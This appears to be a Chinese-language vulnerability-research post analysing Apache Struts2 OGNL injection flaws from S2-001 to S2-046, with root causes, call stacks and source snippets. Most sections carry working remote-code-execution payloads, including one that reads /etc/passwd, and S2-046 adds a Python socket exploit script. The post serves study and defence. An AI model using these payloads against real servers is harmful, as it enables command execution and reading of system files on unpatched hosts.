---
title: "Struts2 漏洞总结"
author: ["4shen0ne"]
tags: ["java"]
draft: false
---

## 漏洞点 {#漏洞点}


### 生命周期 {#生命周期}

{{< figure src="/ox-hugo/_20220209_140518screenshot.png" >}}


### 漏洞位置 {#漏洞位置}

{{< figure src="/ox-hugo/_20220209_140548screenshot.png" >}}


### 触发点 {#触发点}

{{< figure src="/ox-hugo/_20220209_140609screenshot.png" >}}


## S2-001 {#s2-001}


### 影响范围 {#影响范围}

WebWork 2.1 (with altSyntax enabled)
WebWork 2.2.0 - WebWork 2.2.5
Struts 2.0.0 - Struts 2.0.8


### 漏洞描述 {#漏洞描述}

WebWork2.1+ 和 Struts2 的 `altSyntax` 特性允许用户将 OGNL 表达式插入到文本中，并对
其递归解析，导致攻击者可以插入并执行任意 OGNL

在下面的示例中，用户可以在 name 参数填入 `%{1+1}` 而 phoneNumber 参数置空，当表单
验证失败而重新渲染页面时，会对 name 的值进行解析。正常情况是 `%{name}`, 让用户可以
不用重新填写 name，但由于攻击者填入的是 OGNL 表达式，服务端会递归解析 `%{%{1+1}}`
导致漏洞产生，返回计算结果 2

```html
<s:form action="editUser">
  <s:textfield name="name" />
  <s:textfield name="phoneNumber" />
</s:form>
```


## S2-003 {#s2-003}


### 影响范围 {#影响范围}

Struts 2.0.0 - Struts 2.1.8.1


### 漏洞描述 {#漏洞描述}

Struts2 提供了广泛的 OGNL 表达式计算能力，甚至可以将参数名当作表达式来执行，而在
OGNL 中可以通过 # 来访问 struts 的对象，所以内置的 ParametersInterceptor 类会过
滤参数名中包含 # 在内的各种特殊符号来保证安全性

而 S2-003 就是通过 unicode 编码绕过 ParametersInterceptor 类中的正则过滤，用
`\u0023` 或者 `\43` 代替 #

poc:

```nil
GET /s2_war/index.action?(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&(%27\u0023mycmd\u003d\%27id\%27%27)(bla)(bla)&(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla)) HTTP/1.1
Host: 127.0.0.1:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,pt;q=0.7,da;q=0.6
Cookie: JSESSIONID=FC7DC2221FDB37EAE855C6E6A11E9CC1; _ga=GA1.1.267931382.1545202285
Connection: close
```


## S2-005 {#s2-005}


### 影响范围 {#影响范围}

Struts 2.0.0 - Struts 2.1.8.1


### 漏洞描述 {#漏洞描述}

该漏洞是对 S2-003 补丁的绕过，官方对 S2-003 的修复代码如下（左为 struts-2.0.8，右
为 struts-2.0.12）：

{{< figure src="/ox-hugo/2021-11-15_21-00-08_screenshot.png" >}}

{{< figure src="/ox-hugo/2021-11-15_21-00-17_screenshot.png" >}}

可见修复代码主要引入控制静态方法调用开关 allowStaticMethodAccess 变量，以及用于
控制成员变量访问权限的 SecurityMemberAccess 类对象，然而这两个变量都可以通过
OGNL 表达式控制，所以补丁并没有实际效果

poc:

```text
login.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'deepin-calculator\')')(bla)(bla)
```


## S2-007 {#s2-007}


### 影响范围 {#影响范围}

Struts 2.0.0 - Struts 2.2.3


### 漏洞描述 {#漏洞描述}

当配置了验证规则，且类型转换出错时，ConversionErrorInterceptor 类对产生错误的参
数值进行了不安全的字符串拼接，而造成了 OGNL 表达式注入

漏洞的入口类是
S2-007/web/WEB-INF/lib/xwork-core-2.2.3.jar!/com/opensymphony/xwork2/interceptor/ConversionErrorInterceptor.class

当发生类型转换错误时进入 ConversionErrorInterceptor#intercept 方法，在该方法中获
取导致错误的参数值，并在 getOverrideExpr 方法进行拼接

```java
protected Object getOverrideExpr(ActionInvocation invocation, Object value) {
    return "'" + value + "'";
}
```

可见攻击者可以闭合单引号注入 OGNL 表达式，使其返回值的形式为： `'' + (#xxxx) +
''`, 最后导致中间的表达式执行


## S2-008 {#s2-008}


### 影响范围 {#影响范围}

Struts 2.0.0 - Struts 2.3.17


### 漏洞描述 {#漏洞描述}

为了避免攻击者通过参数执行任意方法，xwork.MethodAccessor.denyMethodExecution 参
数的值默认为 true，且 SecurityMemberAccess.allowStaticMethodAccess 参数值默认为
false。而且从 Struts 2.2.1.1 开始，ParameterInterceptor 只允许以下格式的参数：

```text
acceptedParamNames = "[a-zA-Z0-9\.][()_']+";
```

但是在以下情况仍可以绕过上述限制执行任意 Java 代码：


#### Struts &lt;= 2.2.3 (ExceptionDelegator) {#struts-2-dot-2-dot-3--exceptiondelegator}

当 Struts 将一个参数值赋值给属性而产生异常时，该值会被作为 OGNL 表达式执行，比如
将一个字符串值赋值给一个整型属性


#### Struts &lt;= 2.3.1 (CookieInterceptor) {#struts-2-dot-3-dot-1--cookieinterceptor}

Struts 的白名单机制只应用在请求参数上，但 CookieInterceptor 中并没有使用，所以在
处理 cookie 项时可能导致 OGNL 注入，而且攻击者可以通过表达式将
allowStaticMethodAccess 设置为 true

大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这
个点比较鸡肋


#### Arbitrary File Overwrite in Struts &lt;= 2.3.1 (ParameterInterceptor) {#arbitrary-file-overwrite-in-struts-2-dot-3-dot-1--parameterinterceptor}

虽然 allowStaticMethodAccess 默认是关闭的，但攻击者仍然可以访问只有一个 String 参
数的公共构造方法和 setter 方法，所以仍然可能导致任意文件写入、覆盖


#### Struts &lt;= 2.3.17 (DebuggingInterceptor) {#struts-2-dot-3-dot-17--debugginginterceptor}

应用以开发者模式（developer mode）运行时 DebuggingInterceptor 类可能导致任意代码
执行，不过一般生产环境都不会开启 developer mode，除非是被人放的后门

poc:

```nil
# 无回显
http://localhost:8080/S2-008/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)

# 可回显
http://localhost:8080/S2-008/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ipconfig%27%29.getInputStream%28%29%29)
```

以下是 DebuggingInterceptor#intercept 方法的关键部分，当 debug 参数是 command 时，
会取出 expression 参数，然后调用 OgnlValueStack#findValue

{{< figure src="/ox-hugo/2021-11-16_15-20-39_screenshot.png" >}}

最后把参数名当作 OGNL 表达式进行解析，调用栈如下：

```nil
compile:223, OgnlUtil (com.opensymphony.xwork2.ognl)
getValue:213, OgnlUtil (com.opensymphony.xwork2.ognl)
getValueUsingOgnl:277, OgnlValueStack (com.opensymphony.xwork2.ognl)
tryFindValue:260, OgnlValueStack (com.opensymphony.xwork2.ognl)
tryFindValueWhenExpressionIsNotNull:242, OgnlValueStack (com.opensymphony.xwork2.ognl)
findValue:222, OgnlValueStack (com.opensymphony.xwork2.ognl)
findValue:284, OgnlValueStack (com.opensymphony.xwork2.ognl)
intercept:219, DebuggingInterceptor (org.apache.struts2.interceptor.debugging)
...
```


## S2-009 {#s2-009}


### 影响范围 {#影响范围}

Struts 2.0.0 - Struts 2.3.1.1


### 漏洞描述 {#漏洞描述}

Struts 使用白名单解决了 S2-003 和 S2-005 从参数名注入 OGNL 表达式的情况，使用的
正则如下：

```text
private String acceptedParamNames = "[a-zA-Z0-9\\.\\]\\[\\(\\)_']+";
```

这个漏洞的成因是：类似 `top['foo'](0)` 这样格式的参数名可以通过校验，而 Struts 会
把它解析成 `(top['foo'])(0)`, 也就是把 `top['foo']` 当作表达式执行，这可以从上下文获
取 foo 变量的值

因此可以通过两个参数来绕过白名单：第一个参数的值写入恶意表达式，因为
ParametersInterceptor 只会校验参数名，所以参数值可以写入任意表达式；然后第二个参
数名解析的时候获取这个恶意表达式并执行

poc:

```text
/action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27mkdir%20/tmp/PWNAGE%27%29%29%28meh%29&z[%28foo%29%28%27meh%27%29]=true
```

(注意参数会根据首字母进行排序，要保证第一个参数的首字母排在前面)


## S2-012 {#s2-012}


### 影响范围 {#影响范围}

Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2


### 漏洞描述 {#漏洞描述}

在之前的漏洞中，我们都是在请求参数名中插入 OGNL 表达式令其执行，而 struts 也相应
地增加了白名单机制来过滤恶意参数名。但参数值还是可以写入任意内容的，只要找到条件
让 struts 把参数值当作 OGNL 表达式来解析，就可以绕过之前的防护

012 漏洞的原因即在重定向时，从内存获取我们之前输入的参数值，这时会将它当作 OGNL
表达式执行

vulhub 示例：

```xml
<package name="S2-012" extends="struts-default">
	<action name="user" class="com.demo.action.UserAction">
		<result name="redirect" type="redirect">/index.jsp?name=${name}</result>
		<result name="input">/index.jsp</result>
		<result name="success">/index.jsp</result>
	</action>
</package>
```

当 UserAction 发生重定向时，会将 name 的值作为重定向页面的参数，导致表达式执行

poc:

```nil
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```


## S2-013 {#s2-013}


### 影响范围 {#影响范围}

Struts 2.0.0 - Struts 2.3.14.1


### 漏洞描述 {#漏洞描述}

`<s:url` 和 `<s:a` 两个标签用于生成 anchor，而且它们有一个 includeParams 属性可以把
当前页面的参数添加到 anchor 的 href 中，includeParams 的可选值如下：

1.  none: 不包含原请求参数
2.  get: 只包含 get 请求参数
3.  all: 包含 get 请求和 post 请求参数

例子：

```html
<p><s:a id="link1" action="link" includeParams="all">"s:a" tag</s:a></p>
<p><s:url id="link2" action="link" includeParams="all">"s:url" tag</s:url></p>
```

当用户访问 link.action 并携带请求参数时，会在页面中生成两个 &lt;a&gt; 元素，并且 href 包
含当前请求的参数。而 struts 在获取原请求参数时，把值当作 OGNL 表达式执行了，因此
导致漏洞产生

我们分析一下 struts2-core-2.2.3.jar!/org/apache/struts2/components/Anchor.class
的执行过程，关键方法如下：

```java
protected void evaluateExtraParams() {
    super.evaluateExtraParams();
    if (this.href != null) {
        this.addParameter("href", this.ensureAttributeSafelyNotEscaped(this.findString(this.href)));
    } else {
        StringWriter sw = new StringWriter();
        this.urlRenderer.beforeRenderUrl(this.urlProvider);
        this.urlRenderer.renderUrl(sw, this.urlProvider);
        String builtHref = sw.toString();
        if (StringUtils.isNotEmpty(builtHref)) {
            this.addParameter("href", this.ensureAttributeSafelyNotEscaped(builtHref));
        }
    }
}
```

首先是在 beforeRenderUrl 方法对 includeParams 属性进行判断，根据属性从
urlComponent 可以拿到需要的参数值（文本值，还没执行表达式）：

{{< figure src="/ox-hugo/2021-11-18_16-46-37_screenshot.png" >}}

然后在 renderUrl 中解析得到最终的 href, 在这个过程中执行了参数值中的表达式，调用
栈如下：

```nil
compile:222, OgnlUtil (com.opensymphony.xwork2.ognl)
getValue:217, OgnlUtil (com.opensymphony.xwork2.ognl)
getValue:342, OgnlValueStack (com.opensymphony.xwork2.ognl)
tryFindValue:331, OgnlValueStack (com.opensymphony.xwork2.ognl)
tryFindValueWhenExpressionIsNotNull:307, OgnlValueStack (com.opensymphony.xwork2.ognl)
findValue:293, OgnlValueStack (com.opensymphony.xwork2.ognl)
findValue:350, OgnlValueStack (com.opensymphony.xwork2.ognl)
translateVariables:196, TextParseUtil (com.opensymphony.xwork2.util)
translateVariables:129, TextParseUtil (com.opensymphony.xwork2.util)
translateVariables:51, TextParseUtil (com.opensymphony.xwork2.util)
translateVariable:288, UrlHelper (org.apache.struts2.views.util)
translateAndEncode:263, UrlHelper (org.apache.struts2.views.util)
buildParameterSubstring:250, UrlHelper (org.apache.struts2.views.util)
buildParametersString:229, UrlHelper (org.apache.struts2.views.util)
buildParametersString:194, UrlHelper (org.apache.struts2.views.util)
buildUrl:172, UrlHelper (org.apache.struts2.views.util)
determineActionURL:410, Component (org.apache.struts2.components)
determineActionURL:68, ComponentUrlProvider (org.apache.struts2.components)
renderUrl:74, ServletUrlRenderer (org.apache.struts2.components)
evaluateExtraParams:107, Anchor (org.apache.struts2.components)
...
```

官方的修复方式是限制 `%{(#exp)}` 格式的 OGNL 执行，但还存在 `%{exp}` 格式可用，导致
补丁被绕过（S2-014)


## S2-015 {#s2-015}


### 影响范围 {#影响范围}

Struts 2.0.0 - Struts 2.3.14.2


### 漏洞描述 {#漏洞描述}

S2-015 包含两种情况产生的漏洞


#### 通配符 {#通配符}

首先是 Struts2 在匹配 Action 的时候可以使用通配符，当找不到所请求的 Action 名称时，
就会访问使用通配符的 Action

示例：

```xml
<action name="*" class="example.ExampleSupport">
    <result>/example/{1}.jsp</result>
</action>
```

`{1}` 是访问的 Action 名称，而且会作为 OGNL 表达式执行。假设用户访问 null.action,
就会匹配到上述配置，然后返回 /example/null.jsp 页面

另外，在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了
SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版
本以后都不能直接通过 `#_memberAccess['allowStaticMethodAccess']=true` 来修改其值达
到重获静态方法调用的能力，但是仍可以通过反射去修改

最终得到以下 payload:

```nil
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()),#q}
```

{{< figure src="/ox-hugo/2021-11-18_22-16-45_screenshot.png" >}}

注意，由于 payload 的位置，命令中带有斜杠可能执行失败(cat /etc/passwd)


#### 表达式二次执行 {#表达式二次执行}

vulhub 的示例代码如下：

```xml
<action name="param" class="com.demo.action.ParamAction">
    <result name="success" type="httpheader">
        <param name="error">305</param>
        <param name="headers.fxxk">${message}</param>
    </result>
</action>
```

在 ParamAction 的响应中，会获取请求中的 message 参数放到 fxxk 头部，首先执行
`${message}` 获取 Action 中的 message 属性，如果该属性的值又是 OGNL 表达式，则会进
行二次执行。所以 payload 的格式为 `%{expression}`

{{< figure src="/ox-hugo/2021-11-18_22-32-04_screenshot.png" >}}


## S2-016 {#s2-016}


### 影响范围 {#影响范围}

Struts 2.0.0 - Struts 2.3.15


### 漏洞描述 {#漏洞描述}

DefaultActionMapper 类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是
重定向前缀，但是这些前缀后面同时可以跟 OGNL 表达式，由于 struts2 没有对这些前缀做过
滤，导致利用 OGNL 表达式调用 java 静态方法执行任意系统命令

poc 和 S2-015 一样，加在重定向前缀后面即可

{{< figure src="/ox-hugo/2021-11-18_23-10-46_screenshot.png" >}}


## S2-019 {#s2-019}


### 影响范围 {#影响范围}

Struts 2.0.0 - Struts 2.3.15.1


### 漏洞描述 {#漏洞描述}

该漏洞的原因是 Struts 默认开启动态方法调用(DMI)特性，该特性在 Struts 2.3.15.2 后
默认关闭，你也可以自己手动关闭：

```text
<constant name="struts.enable.DynamicMethodInvocation" value="false"/>
```

poc:

```nil
?debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A
```


## S2-029 {#s2-029}


### 影响范围 {#影响范围}

Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)


### 漏洞描述 {#漏洞描述}

Struts2 在解析某些标签时，会对标签的属性值进行二次执行求值，那如果第一次获取到的
值是一个 OGNL 表达式，就会导致表达式执行

比如 i18n 和 text 标签的 name 属性：

```xml
<s:i18n name="%{#request.lan}">xxxx</s:i18n>
<s:text name="%{#request.lan}">xxxx</s:text>
```

攻击者可以在请求的 lan 属性中注入表达式，poc:

```nil
(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))
```

注入的位置取决于标签的属性从什么地方获取


## S2-032 {#s2-032}


### 影响范围 {#影响范围}

Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)


### 漏洞描述 {#漏洞描述}

在开启了动态方法调用(Dynamic Method Invocation)的情况下，可以使用 `method:<name>`
的方式来调用名字是 `<name>` 的方法，而这个方法名将会进行 OGNL 表达式计算，导致远程命
令执行漏洞

poc:

```nil
http://your-ip:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id
```


## S2-045 {#s2-045}


### 影响范围 {#影响范围}

Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10


### 漏洞描述 {#漏洞描述}

Struts2 默认处理 multipart 报文的解析器是 jakarta，如果 Content-Type 的值不合法它会
将异常信息返回，并且将 Content-Type 的值作为 OGNL 表达式执行

首先是在 org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest 这个类，
它在调用 parse 方法发生异常时，调用父类 AbstractMultiPartRequest 的
buildErrorMessage 方法生成包含 payload 的错误信息，并添加到当前的 request 中

{{< figure src="/ox-hugo/2021-11-20_18-50-52_screenshot.png" >}}

在 FileUploadInterceptor 调用 LocalizedTextUtil#findText 方法获取错误信息，在这
个过程会进入到 OgnlTextParser#evaluate 方法，执行 $ 或者 % 开头的表达式

{{< figure src="/ox-hugo/2021-11-20_18-57-31_screenshot.png" >}}

调用栈：

```nil
evaluate:13, OgnlTextParser (com.opensymphony.xwork2.util)
translateVariables:166, TextParseUtil (com.opensymphony.xwork2.util)
translateVariables:123, TextParseUtil (com.opensymphony.xwork2.util)
translateVariables:45, TextParseUtil (com.opensymphony.xwork2.util)
getDefaultMessage:729, LocalizedTextUtil (com.opensymphony.xwork2.util)
findText:573, LocalizedTextUtil (com.opensymphony.xwork2.util)
findText:393, LocalizedTextUtil (com.opensymphony.xwork2.util)
intercept:264, FileUploadInterceptor (org.apache.struts2.interceptor)
...
```

在 FileItemIteratorImpl 对象的构造方法中，首先对 contentType 进行了判断，要求
contentType 字符以 `multipart/` 开头：

{{< figure src="/ox-hugo/_20220209_111122screenshot.png" >}}

而在 Dispatcher#wrapRequest 方法中，只要 contentType 包含 multipart/form-data 就会
认为是 multipart 请求。所以可以构造以下 poc(from vulhub):

```text
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
```


## S2-046 {#s2-046}


### 影响范围 {#影响范围}

Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10


### 漏洞描述 {#漏洞描述}

与 s2-045 类似，但是输入点在文件上传的 filename 值位置，并需要使用 `\x00` 截断

poc from vulhub:

```python
import socket

q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\x00b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
p = b'''POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

'''.replace(b'\n', b'\r\n') % (len(q), )

with socket.create_connection(('your-ip', '8080'), timeout=5) as conn:
    conn.send(p + q)
    print(conn.recv(10240).decode())
```
